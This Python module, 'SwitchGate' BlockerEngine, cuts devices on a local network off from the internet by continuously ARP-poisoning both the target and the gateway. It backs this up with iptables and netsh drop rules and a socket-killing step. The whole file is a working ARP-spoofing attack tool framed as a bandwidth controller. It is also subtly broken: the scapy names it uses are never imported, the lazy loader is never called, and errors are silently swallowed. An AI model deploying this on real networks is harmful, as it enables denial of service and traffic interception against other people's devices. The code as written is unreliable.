"""
SwitchGate - Live Network Cutoff & Bandwidth Controller (The Blocker Engine)
Performs sub-second network disconnection and restoration via Precision Layer-2 ARP Spoofing,
Kernel Socket Circuit Breaking (kPerf), and Firewall Drops.
"""
import os
import sys
import time
import platform
import threading
import subprocess
from typing import Dict, Set, Optional

from backend.config import AppConfig
from backend.database import db
from backend.kperf.kperf_engine import kperf_engine
from backend.native.network_engine import native_engine

# Scapy is imported lazily inside start() — NOT at module load time
# This saves 2-3 seconds of startup delay
SCAPY_AVAILABLE = False
_scapy_ARP = None
_scapy_Ether = None
_scapy_sendp = None

def _load_scapy():
    """Lazy-load Scapy on first use (not at import time)."""
    global SCAPY_AVAILABLE, _scapy_ARP, _scapy_Ether, _scapy_sendp
    if SCAPY_AVAILABLE:
        return True
    try:
        import logging
        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
        logging.getLogger("scapy").setLevel(logging.ERROR)
        from scapy.all import ARP, Ether, sendp, conf
        conf.verb = 0
        _scapy_ARP   = ARP
        _scapy_Ether = Ether
        _scapy_sendp = sendp
        SCAPY_AVAILABLE = True
        return True
    except Exception:
        return False

class BlockerEngine:
    def __init__(self):
        self.blocked_targets: Dict[str, Dict[str, str]] = {} # mac -> {ip, mac}
        self.is_running = False
        self._poison_thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()

    def start(self):
        """Initializes blocker engine and loads all existing blocked devices from DB."""
        with self._lock:
            if self.is_running:
                return
            self.is_running = True
            
            # Load currently blocked devices from DB
            all_devices = db.get_all_devices()
            for dev in all_devices:
                if dev.get("is_blocked"):
                    self.blocked_targets[dev["mac"]] = {
                        "ip": dev["ip"],
                        "mac": dev["mac"]
                    }
                    
            self._poison_thread = threading.Thread(target=self._poison_loop, daemon=True, name="SwitchGate-Blocker")
            self._poison_thread.start()

    def stop(self):
        """Clean shutdown - restores all ARP caches before exiting."""
        with self._lock:
            self.is_running = False
            targets_to_restore = list(self.blocked_targets.items())
            self.blocked_targets.clear()

        print("[Blocker] Restoring all network ARP tables on shutdown...")
        for mac, info in targets_to_restore:
            try:
                self._restore_arp(info["ip"], info["mac"])
                self._remove_firewall_rule(info["ip"])
            except Exception:
                pass

        if self._poison_thread and self._poison_thread.is_alive():
            try:
                self._poison_thread.join(timeout=1.0)
            except Exception:
                pass

    def block_device(self, mac: str, ip: str) -> bool:
        """Instantly cuts off internet for target device."""
        if not mac or not ip:
            return False
        mac = mac.lower().replace("-", ":")
        with self._lock:
            self.blocked_targets[mac] = {"ip": ip, "mac": mac}
            
        try:
            # 1. Update Database
            db.update_device_toggle(mac, is_blocked=True)
            
            # 2. Add System Firewall Rule
            self._add_firewall_rule(ip)
            
            # 3. Kernel Circuit Breaker: Kill any active TCP sockets connected to or from this IP
            kperf_engine.kill_sockets_by_remote_ips([ip])
            
            # 4. Fire immediate poison burst
            self._send_poison_packets(ip, mac)
            return True
        except Exception as e:
            print(f"[Blocker Error] block_device ({mac}, {ip}): {e}")
            return False

    def unblock_device(self, mac: str, ip: str) -> bool:
        """Instantly restores internet for target device."""
        if not mac or not ip:
            return False
        mac = mac.lower().replace("-", ":")
        with self._lock:
            if mac in self.blocked_targets:
                del self.blocked_targets[mac]
                
        try:
            # 1. Update Database
            db.update_device_toggle(mac, is_blocked=False)
            
            # 2. Remove System Firewall Rule
            self._remove_firewall_rule(ip)
            
            # 3. Send ARP Restoration burst
            self._restore_arp(ip, mac)
            return True
        except Exception as e:
            print(f"[Blocker Error] unblock_device ({mac}, {ip}): {e}")
            return False

    def block_all(self) -> int:
        """Panic Button: Cuts off all devices and severs external connections."""
        try:
            # 1. Terminate all active external TCP connections instantly
            kperf_engine.panic_kill_all_external()

            # 2. Block all LAN devices
            devices = db.get_all_devices()
            count = 0
            for dev in devices:
                ip = dev.get("ip")
                mac = dev.get("mac")
                if not ip or not mac:
                    continue
                if ip == AppConfig.LOCAL_IP or ip == AppConfig.GATEWAY_IP or mac == AppConfig.HOST_MAC:
                    continue
                if self.block_device(mac, ip):
                    count += 1
            return count
        except Exception as e:
            print(f"[Blocker Error] block_all: {e}")
            return 0

    def unblock_all(self) -> int:
        """Restores internet to all blocked devices."""
        try:
            devices = db.get_all_devices()
            count = 0
            for dev in devices:
                ip = dev.get("ip")
                mac = dev.get("mac")
                if not ip or not mac:
                    continue
                if dev.get("is_blocked"):
                    if self.unblock_device(mac, ip):
                        count += 1
            return count
        except Exception as e:
            print(f"[Blocker Error] unblock_all: {e}")
            return 0

    def _poison_loop(self):
        """Continuous thread that re-poisons blocked devices with 500ms bursts."""
        while self.is_running:
            try:
                targets_copy = {}
                with self._lock:
                    targets_copy = dict(self.blocked_targets)

                for mac, info in targets_copy.items():
                    self._send_poison_packets(info["ip"], info["mac"])

                time.sleep(AppConfig.ARP_POISON_INTERVAL)
            except Exception as e:
                print(f"[Blocker Poison Loop Error] {e}")
                time.sleep(1.0)

    def _send_poison_packets(self, target_ip: str, target_mac: str):
        """Sends precision Layer 2 spoofed ARP packets directly to Target and Router."""
        if not SCAPY_AVAILABLE or not target_ip or not target_mac:
            return

        gateway_ip = AppConfig.GATEWAY_IP
        gateway_mac = AppConfig.GATEWAY_MAC
        host_mac = AppConfig.HOST_MAC
        iface = AppConfig.INTERFACE_NAME or None

        if not gateway_ip or not host_mac or host_mac == "00:00:00:00:00:00":
            return

        try:
            # 1. Unicast to Target: Gateway IP is at Host MAC (Blackhole/Intercept)
            pkt_target = Ether(dst=target_mac, src=host_mac) / ARP(
                op=2, # ARP Reply
                pdst=target_ip,
                hwdst=target_mac,
                psrc=gateway_ip,
                hwsrc=host_mac
            )
            
            # 2. Unicast to Gateway: Target IP is at Host MAC
            if gateway_mac and gateway_mac != "00:00:00:00:00:00":
                pkt_gateway = Ether(dst=gateway_mac, src=host_mac) / ARP(
                    op=2, # ARP Reply
                    pdst=gateway_ip,
                    hwdst=gateway_mac,
                    psrc=target_ip,
                    hwsrc=host_mac
                )
                sendp(pkt_gateway, iface=iface, verbose=0)

            sendp(pkt_target, iface=iface, verbose=0)
        except Exception:
            pass

    def _restore_arp(self, target_ip: str, target_mac: str):
        """Sends clean ARP packets to restore accurate routing in both Target and Router caches."""
        if not SCAPY_AVAILABLE or not target_ip or not target_mac:
            return

        gateway_ip = AppConfig.GATEWAY_IP
        gateway_mac = AppConfig.GATEWAY_MAC
        iface = AppConfig.INTERFACE_NAME or None

        if not gateway_ip:
            return

        try:
            gw_hw = gateway_mac if (gateway_mac and gateway_mac != "00:00:00:00:00:00") else "ff:ff:ff:ff:ff:ff"
            for _ in range(5):
                # Clean target device ARP cache
                restore_target = Ether(dst=target_mac, src=gw_hw) / ARP(
                    op=2,
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=gateway_ip,
                    hwsrc=gw_hw
                )
                sendp(restore_target, iface=iface, verbose=0)

                # Clean gateway router ARP cache
                restore_gw = Ether(dst="ff:ff:ff:ff:ff:ff", src=target_mac) / ARP(
                    op=2,
                    pdst=gateway_ip,
                    hwdst=gw_hw,
                    psrc=target_ip,
                    hwsrc=target_mac
                )
                sendp(restore_gw, iface=iface, verbose=0)
                time.sleep(0.02)
        except Exception:
            pass

    def _add_firewall_rule(self, ip: str):
        """Applies OS-level firewall packet drop."""
        system = platform.system()
        try:
            if system == "Linux":
                subprocess.run(["iptables", "-I", "FORWARD", "-s", ip, "-j", "DROP"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["iptables", "-I", "FORWARD", "-d", ip, "-j", "DROP"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif system == "Windows":
                rule_name = f"SwitchGate_Block_{ip.replace('.', '_')}"
                subprocess.run([
                    "netsh", "advfirewall", "firewall", "add", "rule",
                    f"name={rule_name}", "dir=out", "action=block", f"remoteip={ip}"
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    def _remove_firewall_rule(self, ip: str):
        """Removes OS-level firewall packet drop."""
        system = platform.system()
        try:
            if system == "Linux":
                subprocess.run(["iptables", "-D", "FORWARD", "-s", ip, "-j", "DROP"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["iptables", "-D", "FORWARD", "-d", ip, "-j", "DROP"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif system == "Windows":
                rule_name = f"SwitchGate_Block_{ip.replace('.', '_')}"
                subprocess.run([
                    "netsh", "advfirewall", "firewall", "delete", "rule",
                    f"name={rule_name}"
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

blocker = BlockerEngine()
